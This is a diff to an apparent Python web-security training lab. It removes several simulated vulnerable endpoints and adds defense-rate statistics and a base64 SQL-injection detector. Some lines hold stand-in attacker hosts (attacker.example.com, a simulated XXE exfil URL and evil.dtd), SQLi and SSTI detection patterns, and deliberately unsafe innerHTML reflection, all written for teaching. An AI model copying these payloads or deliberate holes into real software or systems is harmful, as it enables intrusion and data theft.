-<div class="card"><h3>L7 &mdash; Slowloris DoS Simulation</h3>
-<p class="tip">Simulates holding many incomplete HTTP connections.</p>
-<label>Simulated Connections</label><input id="slow-c" value="50">
-<button class="btn" onclick="api('slowloris','slow-out',{connections:g('slow-c')})">Simulate</button>
-<div id="slow-out" class="result"></div></div>
-
-<div class="card"><h3>L7 &mdash; Host Header Injection</h3>
-<p class="tip">Password-reset poisoning via injected Host header: <code>attacker.example.com</code></p>
-<label>Host Header Value</label><input id="hosth-v" value="attacker.example.com">
-<label>Endpoint</label><input id="hosth-ep" value="/api/health">
-<button class="btn" onclick="api('hostheader','hosth-out',{host:g('hosth-v'),endpoint:g('hosth-ep')})">Send</button>
-<div id="hosth-out" class="result"></div></div>
 </div></div>
 
 <!-- LOGS -->
 <div class="section" id="sec-logs">
 <div style="display:flex;gap:10px;margin-bottom:12px;flex-wrap:wrap">
-  <button class="btn-sm" onclick="loadLogs()">Refresh Logs</button>
+    <button class="btn-sm" onclick="refreshLogsAndStats()">Refresh Logs</button>
   <button class="btn-sm" onclick="listLabFiles()">List Lab Files</button>
+    <button class="btn-sm" onclick="loadDefenseStats()">Defense Stats</button>
   <button class="btn-sm" onclick="clearLogs()">Clear Logs</button>
 </div>
+<div class="defense-viz">
+    <div class="pie3d" id="defense-pie">
+        <div class="pie3d-center" id="defense-pie-center">0%</div>
+    </div>
+    <div class="viz-legend" id="defense-legend">Total Requests: 0\nIntercepted Success: 0\nNot Intercepted: 0</div>
+</div>
+<div id="defense-out" class="result" style="margin-bottom:12px">Defense stats not loaded.</div>
 <div id="log-box" class="log-box">Loading...</div>
 </div>
 
@@ -607,14 +708,45 @@ function g(id){ return document.getElementById(id).value; }
 function show(id,t){ var e=document.getElementById(id); if(e) e.textContent=t; }
 function showHtml(id,h){ var e=document.getElementById(id); if(e) e.innerHTML=h; }
 
+var clientDefenseStats={
+    total:0,http_ok:0,http_error:0,network_blocked:0,timeout:0,aborted:0
+};
+
+function beginClientTrace(){
+    clientDefenseStats.total++;
+    var done=false;
+    return function(kind){
+        if(done) return;
+        done=true;
+        if(kind==='http_ok') clientDefenseStats.http_ok++;
+        else if(kind==='http_error') clientDefenseStats.http_error++;
+        else if(kind==='network_blocked') clientDefenseStats.network_blocked++;
+        else if(kind==='timeout') clientDefenseStats.timeout++;
+        else if(kind==='aborted') clientDefenseStats.aborted++;
+    };
+}
+
 function switchTab(name){
   document.querySelectorAll('.section').forEach(function(s){ s.classList.remove('active'); });
   document.querySelectorAll('.tab').forEach(function(t){ t.classList.remove('active'); });
   var s=document.getElementById('sec-'+name);
   if(s) s.classList.add('active');
-  var t=document.querySelector('[onclick="switchTab(\\''+name+'\\')"]');
+    var t=document.querySelector('.tab[data-tab="'+name+'"]');
   if(t) t.classList.add('active');
-  if(name==='logs') loadLogs();
+    if(name==='logs') refreshLogsAndStats();
+}
+
+function updateTabCounts(){
+    document.querySelectorAll('.tab[data-tab]').forEach(function(tab){
+        var key=tab.getAttribute('data-tab');
+        var label=tab.getAttribute('data-label')||key;
+        var section=document.getElementById('sec-'+key);
+        var count=0;
+        if(section){
+            count=section.querySelectorAll('.grid .card').length;
+        }
+        tab.textContent=label+' ('+count+')';
+    });
 }
 
 function parseJsonSafe(text){
@@ -624,6 +756,21 @@ function parseJsonSafe(text){
 function bodyPreview(text){
     if(!text) return '';
     return String(text).replace(/\s+/g,' ').slice(0,220);
+}
+
+function toBase64Utf8(s){
+    try{ return btoa(unescape(encodeURIComponent(s))); }
+    catch(e){ return ''; }
+}
+
+function encodeAndTest(){
+    var raw=g('deser-plain').trim();
+    if(!raw){ show('deser-out','Provide plain SQL payload first.'); return; }
+    var b64=toBase64Utf8(raw);
+    if(!b64){ show('deser-out','Base64 encode failed in current browser context.'); return; }
+    var box=document.getElementById('deser-d');
+    if(box) box.value=b64;
+    api('deser','deser-out',{payload:b64});
 }
 
 function renderApiResult(outId,xhr,jsonObj){
@@ -648,35 +795,57 @@ function renderApiResult(outId,xhr,jsonObj){
     show(outId,lines.join('\\n')+'\\n'+JSON.stringify(jsonObj,null,2));
 }
 
+function renderDefensePie(totalRequests,intercepted){
+    var pie=document.getElementById('defense-pie');
+    var center=document.getElementById('defense-pie-center');
+    var legend=document.getElementById('defense-legend');
+    var safeTotal=Math.max(0,totalRequests||0);
+    var safeIntercept=Math.max(0,Math.min(safeTotal,intercepted||0));
+    var pct=safeTotal?((safeIntercept*100.0)/safeTotal):0;
+    if(pie) pie.style.setProperty('--pct',pct.toFixed(2));
+    if(center) center.textContent=pct.toFixed(1)+'%';
+    if(legend) legend.textContent='Total Requests: '+safeTotal+'\\nIntercepted Success: '+safeIntercept+'\\nNot Intercepted: '+(safeTotal-safeIntercept);
+}
+
 function api(endpoint,outId,params){
   var qs=Object.keys(params).map(function(k){return encodeURIComponent(k)+'='+encodeURIComponent(params[k]);}).join('&');
   var xhr=new XMLHttpRequest();
+    var mark=beginClientTrace();
   xhr.open('GET','/api/'+endpoint+'?'+qs,true);
     xhr.timeout=8000;
   xhr.onreadystatechange=function(){
     if(xhr.readyState!==4) return;
+                if(xhr.status===0) mark('network_blocked');
+                else if(xhr.status>=400) mark('http_error');
+                else mark('http_ok');
         renderApiResult(outId,xhr,parseJsonSafe(xhr.responseText));
   };
     xhr.onerror=function(){
+                mark('network_blocked');
         show(outId,'HTTP 0\\nNetwork error: request blocked/reset before app response.');
     };
     xhr.ontimeout=function(){
+                mark('timeout');
         show(outId,'HTTP 0\\nRequest timeout: upstream security device may have dropped this request.');
     };
     xhr.onabort=function(){
+                mark('aborted');
         show(outId,'HTTP 0\\nRequest aborted before completion.');
     };
   xhr.send();
 }
 
-var storedComments=[];
 function reflectedXSS(){
   var p=g('rxss-i');
   var xhr=new XMLHttpRequest();
+    var mark=beginClientTrace();
   xhr.open('GET','/api/xss?input='+encodeURIComponent(p),true);
     xhr.timeout=8000;
   xhr.onreadystatechange=function(){
     if(xhr.readyState!==4) return;
+                if(xhr.status===0) mark('network_blocked');
+                else if(xhr.status>=400) mark('http_error');
+                else mark('http_ok');
         var d=parseJsonSafe(xhr.responseText);
         if(xhr.status===0){
             show('rxss-out','HTTP 0\\nBlocked/reset before app response.');
@@ -692,18 +861,11 @@ function reflectedXSS(){
         }
         showHtml('rxss-out','<span class="warn">Reflected (unsafe innerHTML):</span>\\n'+d.reflected);
   };
-    xhr.onerror=function(){ show('rxss-out','HTTP 0\\nNetwork error: request blocked/reset.'); };
-    xhr.ontimeout=function(){ show('rxss-out','HTTP 0\\nRequest timeout: likely dropped upstream.'); };
-    xhr.onabort=function(){ show('rxss-out','HTTP 0\\nRequest aborted.'); };
+        xhr.onerror=function(){ mark('network_blocked'); show('rxss-out','HTTP 0\\nNetwork error: request blocked/reset.'); };
+        xhr.ontimeout=function(){ mark('timeout'); show('rxss-out','HTTP 0\\nRequest timeout: likely dropped upstream.'); };
+        xhr.onabort=function(){ mark('aborted'); show('rxss-out','HTTP 0\\nRequest aborted.'); };
   xhr.send();
 }
-function postComment(){ storedComments.push(g('sxss-i')); show('sxss-out','Stored. Click View Board to render.'); }
-function loadComments(){
-  var h='<span class="info">Stored (innerHTML):</span>\\n';
-  storedComments.forEach(function(c){ h+=c+'\\n'; });
-  showHtml('sxss-out',h);
-}
-function domXSS(){ showHtml('dxss-out','<span class="warn">DOM injection:</span>\\n'+g('dxss-i')); }
 
 function bruteForce(){
   var u=g('bf-u');
@@ -791,16 +953,70 @@ function uploadFile(){
   var fd=new FormData();
   fd.append('artifact',input.files[0],input.files[0].name+ext);
   var xhr=new XMLHttpRequest();
+    var mark=beginClientTrace();
   xhr.open('POST','/api/upload',true);
     xhr.timeout=12000;
   xhr.onreadystatechange=function(){
     if(xhr.readyState!==4) return;
+                if(xhr.status===0) mark('network_blocked');
+                else if(xhr.status>=400) mark('http_error');
+                else mark('http_ok');
         renderApiResult('upl-out',xhr,parseJsonSafe(xhr.responseText));
   };
-    xhr.onerror=function(){ show('upl-out','HTTP 0\\nNetwork error: upload blocked/reset before app response.'); };
-    xhr.ontimeout=function(){ show('upl-out','HTTP 0\\nUpload timeout: request may be blocked or dropped upstream.'); };
-    xhr.onabort=function(){ show('upl-out','HTTP 0\\nUpload aborted before completion.'); };
+        xhr.onerror=function(){ mark('network_blocked'); show('upl-out','HTTP 0\\nNetwork error: upload blocked/reset before app response.'); };
+        xhr.ontimeout=function(){ mark('timeout'); show('upl-out','HTTP 0\\nUpload timeout: request may be blocked or dropped upstream.'); };
+        xhr.onabort=function(){ mark('aborted'); show('upl-out','HTTP 0\\nUpload aborted before completion.'); };
   xhr.send(fd);
+}
+
+function loadDefenseStats(){
+    var xhr=new XMLHttpRequest();
+    xhr.open('GET','/api/defense-stats',true);
+    xhr.onreadystatechange=function(){
+        if(xhr.readyState!==4) return;
+        var d=parseJsonSafe(xhr.responseText)||{};
+        if(!d.app){
+            show('defense-out','Failed to load defense stats.');
+            return;
+        }
+        var app=d.app;
+        var clientTotal=clientDefenseStats.total||0;
+        var preAppBlocked=(clientDefenseStats.network_blocked+clientDefenseStats.timeout+clientDefenseStats.aborted);
+        var preAppRate=clientTotal?((preAppBlocked*100.0)/clientTotal).toFixed(2):'0.00';
+        var decidedApp=(app.defended+app.vulnerable);
+        var compositeDen=(decidedApp+preAppBlocked);
+        var compositeRate=compositeDen?(((app.defended+preAppBlocked)*100.0)/compositeDen).toFixed(2):'0.00';
+        var byType=d.by_type||{};
+        var ranked=Object.keys(byType).map(function(k){
+            var it=byType[k]||{};
+            var de=(it.defended||0);
+            var vu=(it.vulnerable||0);
+            var deVu=de+vu;
+            var exposure=deVu?((vu*100.0)/deVu):0;
+            return {name:k,vulnerable:vu,defended:de,benign:(it.benign||0),unknown:(it.unknown||0),total:(it.total||0),exposure:exposure};
+        }).filter(function(x){ return (x.vulnerable+x.defended)>0; })
+          .sort(function(a,b){
+              if(b.exposure!==a.exposure) return b.exposure-a.exposure;
+              return b.vulnerable-a.vulnerable;
+          })
+          .slice(0,5);
+        var lines=[];
+        lines.push('Application-side Defense Rate: '+app.defense_rate+'%');
+        lines.push('App Decisions (attack-like only): defended='+app.defended+', vulnerable='+app.vulnerable+', unknown='+app.unknown+', attack_events='+app.attack_events+', benign='+app.benign_events+', tracked='+app.tracked_events+', ignored='+app.ignored_events+', parsed_log_events='+app.log_events);
+        lines.push('Client Observed Pre-App Blocking (CFW/WAF/Network): '+preAppRate+'%');
+        lines.push('Client Requests: total='+clientTotal+', blocked='+clientDefenseStats.network_blocked+', timeout='+clientDefenseStats.timeout+', aborted='+clientDefenseStats.aborted+', http_error='+clientDefenseStats.http_error+', http_ok='+clientDefenseStats.http_ok);
+        lines.push('Composite Defense Rate (App Defended + Pre-App Blocked): '+compositeRate+'%');
+        if(ranked.length){
+            lines.push('Top Risky Types (higher exposure first):');
+            ranked.forEach(function(r,idx){
+                lines.push((idx+1)+'. '+r.name+' exposure='+r.exposure.toFixed(2)+'% vulnerable='+r.vulnerable+' defended='+r.defended+' benign='+r.benign+' unknown='+r.unknown+' total='+r.total);
+            });
+        }
+        var interceptedSuccess=app.defended+preAppBlocked;
+        renderDefensePie(clientTotal,interceptedSuccess);
+        show('defense-out',lines.join('\\n'));
+    };
+    xhr.send();
 }
 
 function loadLogs(){
@@ -813,6 +1029,11 @@ function loadLogs(){
     if(b) b.textContent=(d.lines||[]).join('\\n')||'No events yet.';
   };
   xhr.send();
+}
+
+function refreshLogsAndStats(){
+        loadLogs();
+        loadDefenseStats();
 }
 
 function listLabFiles(){
@@ -830,10 +1051,15 @@ function listLabFiles(){
 function clearLogs(){
   var xhr=new XMLHttpRequest();
   xhr.open('GET','/api/logs/clear',true);
-  xhr.onreadystatechange=function(){ if(xhr.readyState===4) loadLogs(); };
+        xhr.onreadystatechange=function(){
+                if(xhr.readyState!==4) return;
+                clientDefenseStats={total:0,http_ok:0,http_error:0,network_blocked:0,timeout:0,aborted:0};
+                                refreshLogsAndStats();
+        };
   xhr.send();
 }
-loadLogs();
+updateTabCounts();
+refreshLogsAndStats();
 </script>
 </body>
 </html>"""
@@ -902,6 +1128,10 @@ class LabHandler(BaseHTTPRequestHandler):
             self._send_json({"ok": True, "message": "log cleared"})
             return
 
+        if path == "/api/defense-stats":
+            self._send_json(build_defense_stats())
+            return
+
         # --- SQLi (login bypass) ------------------------------------------
         if path == "/api/sqli":
             u = self._qp(query, "username")
@@ -943,23 +1173,6 @@ class LabHandler(BaseHTTPRequestHandler):
                                              {"id": 2, "name": "Widget B"}]})
             return
 
-        # --- NoSQL injection -----------------------------------------------
-        if path == "/api/nosqli":
-            u = self._qp(query, "username")
-            p = self._qp(query, "password")
-            bypass = "$gt" in u or "$ne" in u or "$where" in u or "$gt" in p
-            if bypass:
-                append_event("nosqli", "bypass", "username=%s" % u)
-                self._send_json({"ok": True, "bypassed": True,
-                                 "message": "NoSQL operator injection: auth short-circuited",
-                                 "simulated_query": '{"username":%s,"password":"%s"}' % (u, p)})
-            else:
-                valid = any(r["username"] == u and r["password"] == p for r in USERS)
-                append_event("nosqli", "ok" if valid else "failed", "username=%s" % u)
-                self._send_json({"ok": valid, "bypassed": False,
-                                 "message": "valid" if valid else "invalid"})
-            return
-
         # --- Command injection -----------------------------------------------
         if path == "/api/cmdi":
             host = self._qp(query, "host")
@@ -978,36 +1191,6 @@ class LabHandler(BaseHTTPRequestHandler):
                        "1 packets transmitted, 1 received, 0%% packet loss" % (host, host))
             self._send_json({"ok": True, "command": cmd, "dangerous": bool(dangerous),
                              "output": out})
-            return
-
-        # --- LDAP injection --------------------------------------------------
-        if path == "/api/ldapi":
-            u = self._qp(query, "username")
-            p = self._qp(query, "password")
-            filt = "(&(uid=%s)(userPassword=%s))" % (u, p)
-            bypass = "*" in u or ")(" in u or "(&" in u
-            append_event("ldapi", "bypass" if bypass else "ok", filt)
-            self._send_json({"ok": True, "filter": filt, "bypassed": bypass,
-                             "message": "LDAP injection — auth bypassed" if bypass
-                             else "no injection detected"})
-            return
-
-        # --- SSTI ------------------------------------------------------------
-        if path == "/api/ssti":
-            inp = self._qp(query, "input")
-            rce_patterns = ["__class__", "__mro__", "__subclasses__", "popen",
-                            "subprocess", "os.system", "eval", "exec"]
-            rce = any(pat in inp for pat in rce_patterns)
-            result = inp
-            m = re.match(r'^\{\{(\d+)\*(\d+)\}\}$', inp.strip())
-            if m:
-                result = "{{%s*%s}} => %d" % (m.group(1), m.group(2),
-                                               int(m.group(1)) * int(m.group(2)))
-            append_event("ssti", "rce_attempt" if rce else "rendered", inp)
-            self._send_json({"ok": True, "input": inp, "rendered": result,
-                             "rce_pattern_detected": rce,
-                             "note": "RCE gadget detected" if rce
-                             else "arithmetic evaluated safely"})
             return
 
         # --- CRLF injection --------------------------------------------------
@@ -1083,51 +1266,6 @@ class LabHandler(BaseHTTPRequestHandler):
             self._send_json({"ok": True, "result": result})
             return
 
-        # --- Privilege escalation -------------------------------------------
-        if path == "/api/privesc":
-            role    = self._qp(query, "role", "viewer")
-            granted = role == "administrator"
-            append_event("privesc", "escalated" if granted else "ok", "role=%s" % role)
-            self._send_json({"ok": True, "claimed_role": role,
-                             "access_granted": granted,
-                             "admin_data": {"flag": "ADMIN_ACCESS_GRANTED",
-                                            "users": USERS} if granted else None,
-                             "note": "No server-side role check" if granted else "Insufficient role"})
-            return
-
-        # --- Weak cryptography -----------------------------------------------
-        if path == "/api/weakcrypto":
-            pw  = self._qp(query, "password")
-            alg = self._qp(query, "alg", "md5")
-            if alg == "md5":
-                h = hashlib.md5(pw.encode()).hexdigest()
-                note = "MD5 is broken — rainbow tables can crack instantly"
-            elif alg == "sha1":
-                h = hashlib.sha1(pw.encode()).hexdigest()
-                note = "SHA-1 deprecated — collision attacks demonstrated"
-            elif alg == "sha256":
-                h = hashlib.sha256(pw.encode()).hexdigest()
-                note = "SHA-256 without salt is still vulnerable to rainbow tables"
-            else:
-                h = "$2b$12$FakeLabBcryptHashSaltAndHashSimulated"
-                note = "bcrypt (simulated) — proper adaptive hash with cost factor"
-            append_event("weakcrypto", alg, "len=%d" % len(pw))
-            self._send_json({"ok": True, "algorithm": alg, "hash": h, "note": note})
-            return
-
-        # --- Log forging -----------------------------------------------------
-        if path == "/api/logforge":
-            raw     = self._qp(query, "msg")
-            decoded = (raw.replace("%0a", "\n")
-                       .replace("%0d%0a", "\n")
-                       .replace("%0d", "\n"))
-            lines = decoded.split("\n")
-            for line in lines:
-                append_event("logforge_injected", "warn", line)
-            self._send_json({"ok": True, "lines_injected": len(lines),
-                             "note": "Forged log lines written — check Event Logs tab"})
-            return
-
         # --- XSS (reflected) -------------------------------------------------
         if path == "/api/xss":
             payload = self._qp(query, "input")
@@ -1174,21 +1312,6 @@ class LabHandler(BaseHTTPRequestHandler):
                              "content": content})
             return
 
-        # --- Directory listing -----------------------------------------------
-        if path == "/api/dirlist":
-            p = self._qp(query, "path", "/")
-            mapped = {
-                "/":          ["index.html", "lab_files/", "uploads/", "lab_events.log"],
-                "/lab_files": list(XXE_FILES.keys()),
-                "/uploads":   (os.listdir(UPLOADS_DIR)
-                               if os.path.isdir(UPLOADS_DIR) else []),
-            }
-            entries = mapped.get(p, [])
-            append_event("dirlist", "exposed" if entries else "miss", p)
-            self._send_json({"ok": True, "path": p, "entries": entries,
-                             "note": "Directory listing enabled — A05 misconfiguration"})
-            return
-
         # --- Dot-file / backup -----------------------------------------------
         if path == "/api/dotfile":
             f = self._qp(query, "file", ".env")
@@ -1206,16 +1329,6 @@ class LabHandler(BaseHTTPRequestHandler):
                 append_event("dotfile", "exposed", f)
                 self._send_json({"ok": True, "file": f, "content": content,
                                  "note": "Backup file exposed"})
-            return
-
-        # --- SSRF ------------------------------------------------------------
-        if path == "/api/ssrf":
-            url  = self._qp(query, "url")
-            host = url.split("/")[0].split("@")[-1].split(":")[0]
-            resp = SSRF_TARGETS.get(host, "Connection refused (simulated)")
-            append_event("ssrf", "hit" if host in SSRF_TARGETS else "miss", url)
-            self._send_json({"ok": True, "requested_url": url, "host": host,
-                             "hit": host in SSRF_TARGETS, "response": resp})
             return
 
         # --- SSRF via redirect -----------------------------------------------
@@ -1249,39 +1362,45 @@ class LabHandler(BaseHTTPRequestHandler):
                              "note": "DOCTYPE not sanitized — XXE possible"})
             return
 
-        # --- XXE blind OOB ---------------------------------------------------
-        if path == "/api/xxe_blind":
-            cb_host  = self._qp(query, "host")
-            file_key = self._qp(query, "file", "passwd")
-            content  = XXE_FILES.get(file_key, "")
-            exfil_b64 = base64.b64encode(content.encode()).decode()
-            exfil_url = "http://%s/?data=%s..." % (cb_host, exfil_b64[:60])
-            append_event("xxe_oob", "exfil", "host=%s file=%s" % (cb_host, file_key))
-            self._send_json({"ok": True, "attack": "blind_xxe_oob",
-                             "dtd_fetched": "http://%s/evil.dtd" % cb_host,
-                             "exfil_url_simulated": exfil_url,
-                             "exfiltrated_preview": content[:120] + "...",
-                             "note": "OOB simulated — no real network request made"})
-            return
-
-        # --- Insecure deserialization ----------------------------------------
+        # --- Base64 SQL injection simulation ---------------------------------
         if path == "/api/deser":
-            data   = self._qp(query, "data")
-            fmt    = self._qp(query, "format", "json")
-            gadget = any(g in data for g in DESER_GADGETS)
-            result = {}
+            b64_payload = self._qp(query, "payload") or self._qp(query, "data")
+            if not b64_payload:
+                self._send_json({"ok": False, "error": "missing base64 payload"}, 400)
+                return
+
+            decoded = ""
             try:
-                decoded = base64.b64decode(data + "==").decode("utf-8", "ignore")
-                if fmt == "json":
-                    result = json.loads(decoded)
+                pad = "=" * ((4 - len(b64_payload) % 4) % 4)
+                norm = (b64_payload + pad).encode("utf-8", "ignore")
+                decoded = base64.b64decode(norm, altchars=b"-_").decode("utf-8", "ignore")
             except Exception:
-                result = {"raw": data[:80]}
-            append_event("deser", "gadget" if gadget else "ok",
-                         "format=%s gadget=%s" % (fmt, gadget))
-            self._send_json({"ok": True, "format": fmt, "deserialized": result,
-                             "gadget_chain_detected": gadget,
-                             "note": "Gadget chain detected — RCE possible in real deserializer"
-                             if gadget else "No obvious gadget"})
+                decoded = ""
+
+            if not decoded:
+                append_event("sqli_b64", "decode_error", b64_payload[:80])
+                self._send_json({"ok": False,
+                                 "error": "invalid base64 payload",
+                                 "payload_b64": b64_payload[:120]}, 400)
+                return
+
+            low = decoded.lower()
+            union_detected = bool(re.search(r"\bunion\b[\s\S]*\bselect\b", low))
+            bypass_detected = ("' or '1'='1" in low or " or 1=1" in low
+                               or "--" in low or "#" in low)
+            injection = union_detected or bypass_detected
+            sql = "SELECT id,name,price FROM products WHERE name LIKE '%%%s%%'" % decoded
+
+            append_event("sqli_b64", "sqli" if injection else "safe", decoded[:120])
+            self._send_json({"ok": True,
+                             "payload_b64": b64_payload,
+                             "decoded_payload": decoded,
+                             "query": sql,
+                             "union_detected": union_detected,
+                             "bypass_detected": bypass_detected,
+                             "injection_detected": injection,
+                             "note": "UNION/tautology pattern detected in decoded payload"
+                             if injection else "Decoded payload does not match common SQLi signatures"})
             return
 
         # --- Log4Shell -------------------------------------------------------
@@ -1296,92 +1415,6 @@ class LabHandler(BaseHTTPRequestHandler):
                              "simulated_callback": "ldap://attacker.example.com/a -> RMI class loaded"
                              if is_jndi else None,
                              "note": "CVE-2021-44228 simulation — no real JNDI call"})
-            return
-
-        # --- Debug endpoint --------------------------------------------------
-        if path == "/api/debugpath":
-            p = self._qp(query, "path", "/debug")
-            exposed = {
-                "/debug":        {"debug": True, "env": {"DB_PASS": "LabOnlyPassword123"}, "heap_mb": 128},
-                "/_debug":       {"debug": True, "threads": 4},
-                "/console":      {"console": "enabled", "note": "Groovy console accessible"},
-                "/actuator/env": {"activeProfiles": ["dev"],
-                                  "propertySources": [{"name": "applicationConfig",
-                                                        "properties": {"db.password": {"value": "LabOnlyPassword123"}}}]},
-            }
-            data = exposed.get(p)
-            append_event("debugpath", "exposed" if data else "miss", p)
-            self._send_json({"ok": bool(data), "path": p,
-                             "exposed": data,
-                             "note": "Debug endpoint exposed — A05 misconfiguration" if data
-                             else "path not a known debug path"})
-            return
-
-        # --- Default credentials --------------------------------------------
-        if path == "/api/defcred":
-            u = self._qp(query, "username")
-            p = self._qp(query, "password")
-            weak = [("admin","admin"),("admin","password"),("root","root"),
-                    ("admin","1234"),("guest","guest"),("admin","")]
-            hit   = (u, p) in weak
-            exact = any(r["username"] == u and r["password"] == p for r in USERS)
-            append_event("defcred", "hit" if (hit or exact) else "fail",
-                         "u=%s" % u)
-            self._send_json({"ok": True, "default_cred_match": hit,
-                             "valid_lab_cred": exact,
-                             "access": hit or exact,
-                             "note": "Weak default credential" if hit else "No default match"})
-            return
-
-        # --- Method tampering ------------------------------------------------
-        if path == "/api/method_tamper":
-            method      = self._qp(query, "method", "TRACE").upper()
-            target_path = self._qp(query, "path", "/api/health")
-            dangerous   = method in ("TRACE","CONNECT","DELETE","PUT","PATCH")
-            append_event("method_tamper", "dangerous" if dangerous else "ok",
-                         "method=%s path=%s" % (method, target_path))
-            self._send_json({"ok": True, "method": method, "path": target_path,
-                             "dangerous": dangerous,
-                             "note": "%s should be blocked" % method if dangerous
-                             else "Method acceptable"})
-            return
-
-        # --- File IDOR -------------------------------------------------------
-        if path == "/api/file_idor":
-            rid       = self._qp(query, "id", "1")
-            traversal = ".." in rid or "/" in rid
-            reports   = {
-                "1": "Q1 Sales Report: revenue=$1.2M",
-                "2": "HR Confidential: employees=47, avg_salary=85000",
-                "3": "Pentest Findings: critical=3 high=12",
-            }
-            content = reports.get(rid)
-            if traversal:
-                append_event("file_idor", "traversal", rid)
-                self._send_json({"ok": False, "error": "traversal detected",
-                                 "note": "Path traversal via report ID"})
-            elif content:
-                append_event("file_idor", "hit", "id=%s" % rid)
-                self._send_json({"ok": True, "report_id": rid, "content": content,
-                                 "note": "IDOR — no ownership check"})
-            else:
-                self._send_json({"ok": False, "error": "report not found"}, 404)
-            return
-
-        # --- Verbose error ---------------------------------------------------
-        if path == "/api/verbose_error":
-            inp = self._qp(query, "input")
-            append_event("verbose_error", "triggered", inp[:80])
-            self._send_json({"ok": False,
-                             "exception": "TemplateRenderError",
-                             "traceback": (
-                                 "Traceback (most recent call last):\n"
-                                 "  File \"/app/render.py\", line 42, in render_template\n"
-                                 "    return env.from_string(template).render(ctx)\n"
-                                 "jinja2.exceptions.UndefinedError: '%s' is undefined" % inp
-                             ),
-                             "server": "LabApp/1.0 Python/3.6.8",
-                             "note": "Full traceback exposed — information disclosure A05"})
             return
 
         # --- IP spoofing -----------------------------------------------------
@@ -1434,48 +1467,6 @@ class LabHandler(BaseHTTPRequestHandler):
                              "note": "No real packets sent — log generated for WAF/IDS"})
             return
 
-        # --- Slowloris -------------------------------------------------------
-        if path == "/api/slowloris":
-            conns = self._qp(query, "connections", "50")
-            append_event("slowloris", "simulated", "connections=%s" % conns)
-            self._send_json({"ok": True, "attack": "slowloris_simulation",
-                             "simulated_connections": conns,
-                             "note": "No real sockets opened — log entry generated"})
-            return
-
-        # --- Host header injection -------------------------------------------
-        if path == "/api/hostheader":
-            h_val    = self._qp(query, "host")
-            ep       = self._qp(query, "endpoint", "/api/health")
-            real     = self.headers.get("Host", "")
-            poisoned = h_val not in ("localhost", "127.0.0.1", "0.0.0.0")
-            link     = "https://%s/reset?token=lab-fake-token-abc123" % h_val
-            append_event("hostheader", "poisoned" if poisoned else "ok",
-                         "host=%s ep=%s" % (h_val, ep))
-            self._send_json({"ok": True, "injected_host": h_val, "real_host": real,
-                             "poisoned": poisoned,
-                             "poisoned_reset_link": link if poisoned else None,
-                             "note": "Host header used in reset link — cache poisoning risk"
-                             if poisoned else "Host is local"})
-            return
-
-        # --- Polyglot upload -------------------------------------------------
-        if path == "/api/polyglot":
-            fn  = self._qp(query, "filename")
-            ct  = self._qp(query, "ct", "image/jpeg")
-            pl  = self._qp(query, "payload")
-            risky_ext = any(ext in fn.lower()
-                            for ext in [".php",".jsp",".aspx",".phtml",".php5"])
-            script_sig = "<?php" in pl or "<%" in pl
-            append_event("polyglot_upload", "risky" if (risky_ext or script_sig) else "ok",
-                         "fn=%s ct=%s" % (fn, ct))
-            self._send_json({"ok": True, "filename": fn, "content_type": ct,
-                             "risky_extension": risky_ext,
-                             "script_signature": script_sig,
-                             "note": "Polyglot accepted — content-type mismatch not rejected"
-                             if (risky_ext or script_sig) else "File appears benign"})
-            return
-
         self.send_error(404, "Not Found")
 
     # ------------------------------------------------------------------
@@ -1517,7 +1508,8 @@ class LabHandler(BaseHTTPRequestHandler):
         risky_ext = os.path.splitext(fname)[1].lower() in (
             ".php",".php5",".phtml",".jsp",".aspx",".sh",".py",".exe")
 
-        append_event("upload", "stored",
+        upload_status = "stored_attack" if (eicar or risky_ext or script_hd) else "stored_benign"
+        append_event("upload", upload_status,
                      "file=%s bytes=%d sha256=%s eicar=%s risky_ext=%s" % (
                          stored, len(data), sha256, eicar, risky_ext))
 
